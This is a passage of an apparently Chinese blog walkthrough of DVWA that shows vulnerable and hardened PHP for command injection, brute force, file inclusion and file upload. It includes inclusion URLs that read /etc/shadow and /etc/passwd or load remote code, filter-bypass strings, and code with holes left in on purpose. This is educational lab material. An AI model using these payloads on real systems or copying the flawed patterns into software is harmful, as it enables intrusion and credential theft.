class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>这里采用黑名单过滤的方式，注意到黑名单的办法存在的通病就是过滤不完全。可以看到这里也一样，没有把之前提到的东西给过滤完全。其实highlevel也是一样的，过滤语句写得不严谨，多加了空格，造成绕过，这里就不再展开叙述了。同过这个例子可以直观的看到黑名单式过滤方式是不安全的，容易出岔子。接着我们将看到Impossible等级下的白名单试想方式。直接指定只接受<code>num.num.num.num</code>型的输入，也就是我们期望的输入，从而避免了命令执行。</p><ul><li>Impossible level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">'ip'</span> ]; </span><br><span class="line">    $target = stripslashes( $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects </span></span><br><span class="line">    $octet = explode( <span class="string">"."</span>, $target ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer </span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// If all 4 octets are int's put the IP back together. </span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">'.'</span> . $octet[<span class="number">1</span>] . <span class="string">'.'</span> . $octet[<span class="number">2</span>] . <span class="string">'.'</span> . $octet[<span class="number">3</span>]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">'s'</span> ), <span class="string">'Windows NT'</span> ) ) &#123; </span><br><span class="line">            <span class="comment">// Windows </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// *nix </span></span><br><span class="line">            $cmd = shell_exec( <span class="string">'ping  -c 4 '</span> . $target ); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>暴力枚举攻击，服务端没有在后台设置错误次数上限和相关校验，就会给攻击者暴力枚举用户或者基于字典的密码暴力破解。所以正确的代码编写规范需要规定容许的错误尝试次数，超过这个值就会锁定账户一个定义长的时间。这里需要明确，光加入一个随机的token就想避免Brute Force是相当幼稚的，攻击者通过python脚本来抓取页面的token，就可以完全绕过，这也是high等级所犯的错。这里就不展示，只列出impossible等级和low 等级的代码，供日后查阅：</p><ul><li><p>low level</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Get username </span></span><br><span class="line">    $user = $_GET[ <span class="string">'username'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password </span></span><br><span class="line">    $pass = $_GET[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database </span></span><br><span class="line">    $query  = <span class="string">"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';"</span>; </span><br><span class="line">    $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( $result &amp;&amp; mysql_num_rows( $result ) == <span class="number">1</span> ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar = mysql_result( $result, <span class="number">0</span>, <span class="string">"avatar"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Impossible level</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Login'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise username input </span></span><br><span class="line">    $user = $_POST[ <span class="string">'username'</span> ]; </span><br><span class="line">    $user = stripslashes( $user ); </span><br><span class="line">    $user = mysql_real_escape_string( $user ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise password input </span></span><br><span class="line">    $pass = $_POST[ <span class="string">'password'</span> ]; </span><br><span class="line">    $pass = stripslashes( $pass ); </span><br><span class="line">    $pass = mysql_real_escape_string( $pass ); </span><br><span class="line">    $pass = md5( $pass ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default values </span></span><br><span class="line">    $total_failed_login = <span class="number">3</span>; </span><br><span class="line">    $lockout_time       = <span class="number">15</span>; </span><br><span class="line">    $account_locked     = <span class="keyword">false</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (Check user information) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if the user has been locked out. </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $row[ <span class="string">'failed_login'</span> ] &gt;= $total_failed_login ) )  &#123; </span><br><span class="line">        <span class="comment">// User locked out.  Note, using this method would allow for user enumeration! </span></span><br><span class="line">        <span class="comment">//echo "&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;"; </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Calculate when the user would be allowed to login again </span></span><br><span class="line">        $last_login = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line">        $last_login = strtotime( $last_login ); </span><br><span class="line">        $timeout    = strtotime( <span class="string">"&#123;$last_login&#125; +&#123;$lockout_time&#125; minutes"</span> ); </span><br><span class="line">        $timenow    = strtotime( <span class="string">"now"</span> ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check to see if enough time has passed, if it hasn't locked the account </span></span><br><span class="line">        <span class="keyword">if</span>( $timenow &gt; $timeout ) </span><br><span class="line">            $account_locked = <span class="keyword">true</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database (if username matches the password) </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">    $row = $data-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// If its a valid login... </span></span><br><span class="line">    <span class="keyword">if</span>( ( $data-&gt;rowCount() == <span class="number">1</span> ) &amp;&amp; ( $account_locked == <span class="keyword">false</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Get users details </span></span><br><span class="line">        $avatar       = $row[ <span class="string">'avatar'</span> ]; </span><br><span class="line">        $failed_login = $row[ <span class="string">'failed_login'</span> ]; </span><br><span class="line">        $last_login   = $row[ <span class="string">'last_login'</span> ]; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;"</span>; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$avatar&#125;\" /&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Had the account been locked out since last login? </span></span><br><span class="line">        <span class="keyword">if</span>( $failed_login &gt;= $total_failed_login ) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;"</span>; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reset bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Login failed </span></span><br><span class="line">        sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) ); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Give the user some feedback </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update bad login count </span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">        $data-&gt;execute(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the last login time </span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> ); </span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, $user, PDO::PARAM_STR ); </span><br><span class="line">    $data-&gt;execute(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token </span></span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>我们可以看到，在impossible代码中，不但设置了错误次数锁，Anti-CSRF token,而且还提供了暴力尝试信息反馈，当用户登陆成功后会将被暴力登陆的次数给反馈给正确登陆的用户。这个实现得益于，每次错误尝试都会更新last_login的时间和failed_login+1操作，然后将之入库。</p><h3 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion)"></a>Local File Inclusion)</h3><blockquote><p>漏洞根据利用方式可以分为：本地文件包含(Local File Inclusion),简称LFI。远程文件包含(Remote File Inclusion),简称RFI。</p></blockquote><p>涉及到的函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">include()：只有代码执行到该函数时才会包含文件进来，发生错误时只给出一个警告并继续向下执行。</span><br><span class="line"> </span><br><span class="line">include_once()：和include()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line"> </span><br><span class="line">require()：只要程序执行就包含文件进来，发生错误时会输出错误结果并终止运行。</span><br><span class="line"> </span><br><span class="line">require_once()：和require()功能相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br></pre></td></tr></table></figure></p><p>文件包含光从字面意思来看是可以通过漏洞利用泄露一些本地敏感文件，但是益于以上几个函数在包含文件的时候是默认把文件当成代码来对待，如果出现可执行的php片段就会执行这一性质，文件包含漏洞一般是可以进行任意代码执行的，只要我们能够让服务器包含我们可控的代码段。</p><ul><li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>没有对我们的输入做任何过滤，可以说是一点安全意识都没有。随便利用。举个栗子：<code>http://localhost/dvwa/vulnerabilities/fi/page=/etc/shadow</code>当然也可以在服务端写下poc.php,利用http协议实现代码执行<code>http://localhost/dvwa/vulnerabilities/fi/page=http://[ip]/poc.php</code>。前提条件是<code>allow_url_fopen</code>和<code>allow_url_include</code>处于打开状态。</p><ul><li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file ); </span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file ); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>首先这个基于黑名单的过滤，压根就没有把本地绝对路径考虑到，其次可以使用<code>..././</code>,<code>htthttpp</code>进行绕过。</p><ul><li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display </span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ]; </span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation </span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">"file*"</span>, $file ) &amp;&amp; $file != <span class="string">"include.php"</span> ) &#123; </span><br><span class="line">    <span class="comment">// This isn't the page we want! </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"ERROR: File not found!"</span>; </span><br><span class="line">    <span class="keyword">exit</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>这是一种基于白名单的过滤，只接受前缀为“file”的文件，咋一看很ok，然而却疏忽了file协议。<code>http://localhost/vulnerabilities/fi/?page=file:///etc/passwd</code></p><ul><li>Impossible level<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// The page we wish to display </span><br><span class="line">$file = $_GET[ &apos;page&apos; ]; </span><br><span class="line"></span><br><span class="line">// Only allow include.php or file&#123;1..3&#125;.php </span><br><span class="line">if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; ) &#123; </span><br><span class="line">    // This isn&apos;t the page we want! </span><br><span class="line">    echo &quot;ERROR: File not found!&quot;; </span><br><span class="line">    exit; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><p>这是相当的白名单，你赢了。但是想要文件量巨大的场景中维护这么一张白名单有点不太理智，所以笔者这种硬编码的方式不太常用。</p><h3 id="upload-file"><a href="#upload-file" class="headerlink" title="upload file"></a>upload file</h3><p>上传漏洞经常可以用来上传任意代码泄露系统信息，如<code>&lt;?php phpinfo();?&gt;</code>，甚至可以直接上传webshell，拿下服务器权限，所以这个漏洞是十分严重的。</p><ul><li>Low level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">        <span class="comment">// No </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Yes! </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>可以看到上面的代码对用户上传的文件（<code>$_FILE</code>全局数组的形式）没有进行任何的验证操作，就直接将其move到了upload目录，这是相当危险的操作，攻击者可以毫无忌惮的随意日。</p><ul><li>Medium level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">'Upload'</span> ] ) ) &#123; </span><br><span class="line">    <span class="comment">// Where are we going to be writing to? </span></span><br><span class="line">    $target_path  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">"hackable/uploads/"</span>; </span><br><span class="line">    $target_path .= basename( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ] ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information </span></span><br><span class="line">    $uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ]; </span><br><span class="line">    $uploaded_type = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    $uploaded_size = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image? </span></span><br><span class="line">    <span class="keyword">if</span>( ( $uploaded_type == <span class="string">"image/jpeg"</span> || $uploaded_type == <span class="string">"image/png"</span> ) &amp;&amp; </span><br><span class="line">        ( $uploaded_size &lt; <span class="number">100000</span> ) ) &#123; <span class="comment">#只判断了MIME</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder? </span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ], $target_path ) ) &#123; </span><br><span class="line">            <span class="comment">// No </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="comment">// Yes! </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// Invalid file </span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>上面的代码加入了MIME判断，所谓的MIME判断是在请求头中的一个字段，用来指示文件类型，方便服务器进行对应的处理，只要抓包就可以随意修改，达到欺骗服务器的目的。（更多的解释可以查看：<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types）" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types）</a></p><ul><li>High level<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 